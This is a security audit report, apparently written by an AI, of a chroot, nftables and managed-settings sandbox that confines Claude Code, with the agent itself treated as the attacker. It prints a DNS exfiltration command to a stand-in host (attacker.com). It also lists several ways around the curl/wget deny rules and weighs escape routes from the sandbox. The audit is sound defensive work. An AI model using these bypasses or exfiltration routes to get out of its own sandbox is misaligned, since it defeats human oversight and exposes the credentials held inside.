# Security Audit: Claude Chroot Isolation Implementation

**Audit Date**: 2026-02-11
**Auditor**: Claude (Opus 4.5)
**Scope**: `scripts/claude-chroot-*.sh`, `docs/claude-chroot-setup.md`
**Classification**: Internal Security Review

---

## Executive Summary

This implementation creates a sandboxed environment for Claude Code using chroot, nftables network filtering, and managed settings. The process runs as **unprivileged user UID 1000**, which significantly limits traditional chroot escape vectors.

**Overall Assessment**: Provides reasonable isolation for the intended use case. The primary remaining risks are **data exfiltration via DNS** and **information disclosure**. Classic chroot escape techniques do not apply because the user lacks root privileges.

| Severity | Count |
|----------|-------|
| High | 1 |
| Medium | 4 |
| Low | 5 |
| Informational | 2 |

---

## Threat Model

**Attacker Profile**: Claude Code running inside chroot as UID 1000 (unprivileged)

**What the attacker CAN do**:
- Execute arbitrary code as UID 1000
- Read files owned by or readable to UID 1000
- Make network connections (subject to nftables rules)
- Write to /tmp, /home/claude, and workspace

**What the attacker CANNOT do** (without kernel exploit):
- Become root (no setuid binaries in controlled paths)
- Access files owned by root with restrictive permissions
- Create device nodes (requires CAP_MKNOD)
- Follow /proc/1/root (requires CAP_SYS_PTRACE or root)
- Read block devices (requires root or disk group membership)

---

## High Findings

### HIGH-001: DNS Exfiltration Channel

**Severity**: HIGH
**Location**: `claude-chroot-enter.sh:195-196`
**Status**: CONFIRMED EXPLOITABLE

**Description**: DNS traffic is unrestricted, enabling data exfiltration by an unprivileged user.

**Evidence**:
```bash
# Allow DNS (needed for API hostname resolution)
udp dport 53 accept
tcp dport 53 accept
```

**Exploitation**: No privileges required. An unprivileged user can:
- Encode arbitrary data in DNS queries to attacker-controlled domains
- Use DNS tunneling (iodine, dnscat2, or manual encoding)
- Exfiltrate via TXT record queries
- Typical bandwidth: 10-50 KB/s, sufficient for credentials/code

**Example**:
```bash
# As unprivileged user, exfiltrate data:
echo "secret" | base32 | xargs -I{} dig {}.attacker.com
```

**Recommendation**:
- Run local DNS resolver that only answers for allowed domains
- Use /etc/hosts for all allowed domains, block DNS entirely
- Or accept this risk if exfiltration prevention isn't a goal

---

## Medium Findings

### MED-001: Managed Settings Bypass via Script Execution

**Severity**: MEDIUM
**Location**: `scripts/claude-chroot-managed-settings.json`
**Status**: CONFIRMED BYPASSABLE

**Description**: The managed settings restrict Claude Code's *tool invocations*, not actual binary execution.

**Evidence**:
```json
"Bash(curl:*)",
"Bash(wget:*)",
```

**Bypass Methods** (all work as unprivileged user):
1. Write a shell script, execute it: `echo 'curl $1' > /tmp/f.sh && sh /tmp/f.sh`
2. Use Python: `python3 -c "import urllib.request; ..."`
3. Use full path: `/run/current-system/sw/bin/curl`

**Impact**: Defense-in-depth layer only. Actual network restriction relies on nftables (which works).

**Recommendation**: Document this as a convenience restriction, not a security boundary. The nftables rules are the real enforcement.

---

### MED-002: IP Allowlist Fragility

**Severity**: MEDIUM
**Location**: `claude-chroot-sync-ips.sh`, `claude-chroot-enter.sh:28-46`
**Status**: DESIGN WEAKNESS

**Description**: IP addresses are resolved at script execution time but cloud infrastructure IPs rotate.

**Problems**:
1. DNS resolution occurs before firewall rules applied
2. Cloud providers rotate IPs; allowlist becomes stale
3. CDN edge nodes vary by geography

**Impact**: May block legitimate traffic or allow unintended destinations over time.

**Recommendation**:
- Use `--no-network` mode for maximum security
- Accept that IP-based allowlisting is best-effort
- Consider layer-7 proxy for domain-based filtering if strict control needed

---

### MED-003: Credential Exposure via Config Sync

**Severity**: MEDIUM
**Location**: `claude-chroot-enter.sh:97-102`
**Status**: BY DESIGN

**Description**: Full Claude configuration directory is copied into chroot.

**Evidence**:
```bash
cp -r "$REAL_HOME/.claude/"* "$CHROOT_DIR/home/$CHROOT_USER/.claude/"
```

**Impact**: API keys and OAuth tokens are available inside chroot. If Claude is compromised (prompt injection, malicious code), these credentials are exposed.

**Recommendation**:
- Copy only necessary config files
- Use ephemeral tokens where possible
- Accept this if the goal is isolation, not credential protection

---

### MED-004: Escape Hatch Flag Exists

**Severity**: MEDIUM
**Location**: `claude-chroot-enter.sh:73-76`
**Status**: BY DESIGN

**Description**: `--full-network` flag defeats all network restrictions.

**Evidence**:
```bash
--full-network)
    NETWORK_MODE="full"
```

**Impact**: Users may use this for convenience, bypassing intended restrictions.

**Recommendation**: Remove flag, or require explicit confirmation.

---

## Low Findings

### LOW-001: /sys Information Disclosure

**Severity**: LOW
**Location**: `claude-chroot-enter.sh:154`
**Status**: CONFIRMED (info disclosure only)

**Description**: /sys is bind-mounted, exposing hardware information.

**Readable by unprivileged user**:
- `/sys/class/net/*/address` - MAC addresses
- `/sys/class/dmi/id/*` - Hardware vendor/model
- `/sys/devices/system/cpu/vulnerabilities/*` - CPU vulnerability status
- `/sys/block/*/size` - Disk sizes

**NOT accessible** (requires root):
- Most writable sysfs entries
- Debugfs

**Impact**: Information disclosure about host hardware. No escape vector.

**Recommendation**: If hardware fingerprinting is a concern, don't mount /sys or use a mount namespace.

---

### LOW-002: /proc Information Disclosure

**Severity**: LOW
**Location**: `claude-chroot-enter.sh:153`
**Status**: CONFIRMED (info disclosure only)

**Description**: /proc is bind-mounted, exposing process information.

**Readable by unprivileged user**:
- `/proc/cpuinfo`, `/proc/meminfo` - System specs
- `/proc/version` - Kernel version
- Own process info (`/proc/self/*`)

**NOT accessible** (confirmed):
- `/proc/1/root` - Requires CAP_SYS_PTRACE or root to traverse
- Other users' `/proc/*/environ` - Permission denied
- `/proc/kcore` - Requires root

**Impact**: Information disclosure about host system. **Not an escape vector for unprivileged users.**

**Recommendation**: Acceptable for most use cases. Use PID namespace if full isolation needed.

---

### LOW-003: /dev Exposure (Limited Impact)

**Severity**: LOW
**Location**: `claude-chroot-enter.sh:152`
**Status**: NOT EXPLOITABLE

**Description**: /dev is bind-mounted but device access requires privileges.

**Analysis**:
- Block devices (`/dev/sda*`) - Owned by `root:disk`, mode 0660
- `/dev/mem`, `/dev/kmem` - Owned by `root:kmem`, mode 0640
- mknod - Requires CAP_MKNOD (root only)

**Accessible by unprivileged user**:
- `/dev/null`, `/dev/zero`, `/dev/urandom` - Safe, intended
- `/dev/tty`, `/dev/pts/*` - Own terminal only

**Impact**: None. Traditional /dev escape vectors require root.

**Recommendation**: No action needed.

---

### LOW-004: API Key in Process Environment

**Severity**: LOW
**Location**: `claude-chroot-enter.sh:256`
**Status**: CONFIRMED (limited scope)

**Description**: API key passed via environment variable.

```bash
${ANTHROPIC_API_KEY:+ANTHROPIC_API_KEY="$ANTHROPIC_API_KEY"}
```

**Impact**: Visible in `/proc/self/environ` to the same user. Since only UID 1000 runs in chroot, only that user can see it.

**Recommendation**: Use file-based secrets for defense-in-depth, but this is low risk in practice.

---

### LOW-005: No Resource Limits

**Severity**: LOW
**Location**: Architectural gap
**Status**: CONFIRMED

**Description**: No cgroups or ulimits configured.

**Impact**: DoS possible (fork bomb, memory exhaustion, disk fill). Does not enable escape.

**Recommendation**: Add ulimits in entry script if DoS is a concern:
```bash
ulimit -u 500   # max processes
ulimit -v 4194304  # 4GB virtual memory
```

---

## Informational Findings

### INFO-001: Nix Store is Read-Write

**Severity**: INFORMATIONAL
**Location**: `claude-chroot-enter.sh:158-160`

**Description**: /nix is mounted read-write.

**Analysis**: While the mount is RW, the actual /nix/store is typically:
- Owned by root or nix build users
- Write-protected by Nix's design

An unprivileged user cannot write to /nix/store without nix-daemon access (which isn't configured in this chroot).

**Impact**: Minimal. User cannot install packages without proper Nix setup.

---

### INFO-002: Nix Sandbox Disabled

**Severity**: INFORMATIONAL
**Location**: `claude-chroot-setup.sh:60-63`

**Description**: `sandbox = false` in nix.conf.

**Analysis**: This affects Nix builds, but the chroot user:
1. Cannot run nix-daemon (not configured)
2. Cannot write to /nix/store (no permissions)
3. Can only use pre-built packages via nix-shell

**Impact**: Minimal in this context. Would matter if nix-daemon were running.

---

## Threat Model Analysis

### What This Implementation Actually Provides

| Goal | Status | Notes |
|------|--------|-------|
| Filesystem isolation | **EFFECTIVE** | User cannot access host files outside mounts |
| Network restriction | **MOSTLY EFFECTIVE** | HTTPS restricted; DNS open (exfil risk) |
| Privilege isolation | **EFFECTIVE** | Runs as UID 1000, no setuid, no escape |
| Prevent chroot escape | **EFFECTIVE** | Classic escapes require root |

### Attack Vectors by Feasibility

| Attack | Feasibility | Notes |
|--------|-------------|-------|
| DNS exfiltration | **EASY** | Works, primary remaining risk |
| /proc/1/root escape | **NOT POSSIBLE** | Requires root/CAP_SYS_PTRACE |
| /dev block device read | **NOT POSSIBLE** | Requires root/disk group |
| mknod device creation | **NOT POSSIBLE** | Requires CAP_MKNOD |
| Setuid binary abuse | **NOT POSSIBLE** | No setuid in chroot-controlled paths |
| Kernel exploit | **POSSIBLE** | Always possible, not chroot-specific |
| Managed settings bypass | **EASY** | But nftables still enforces network |

---

## Recommendations Summary

### If DNS Exfiltration is a Concern

1. Use `--no-network` mode (completely isolated)
2. Or deploy local DNS resolver with domain allowlist
3. Or use /etc/hosts and block port 53 entirely

### Defense-in-Depth Improvements

1. Add ulimits to prevent DoS
2. Consider PID namespace for /proc isolation
3. Don't mount /sys if hardware fingerprinting is a concern
4. Remove `--full-network` flag or require confirmation file

### NOT Recommended (Unnecessary)

1. Mounting /proc, /dev, /sys read-only - doesn't add security for unprivileged user
2. Complex seccomp profiles - attack surface already minimal
3. Replacing chroot with containers - current design is effective for threat model

---

## Conclusion

This implementation provides **effective isolation for its intended purpose**: running Claude Code in a restricted environment where it cannot:
- Access the host filesystem (beyond explicit mounts)
- Make arbitrary network connections (HTTPS restricted to allowlist)
- Escalate privileges (no setuid, runs as unprivileged user)

The primary remaining risk is **DNS exfiltration**, which should be addressed if data exfiltration prevention is a requirement.

Previous versions of this audit overstated risks by assuming root privileges inside the chroot. The `--userspec` flag ensuring unprivileged execution is the key security control that makes this design effective.

---

## Appendix: References

- [Linux Programmer's Manual: chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [Container Security by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/)
- [Bubblewrap](https://github.com/containers/bubblewrap) - For future improvements if needed

---

## Alternatives

- [Bubblewrap-claude](https://github.com/matgawin/bubblewrap-claude) __also nix__

---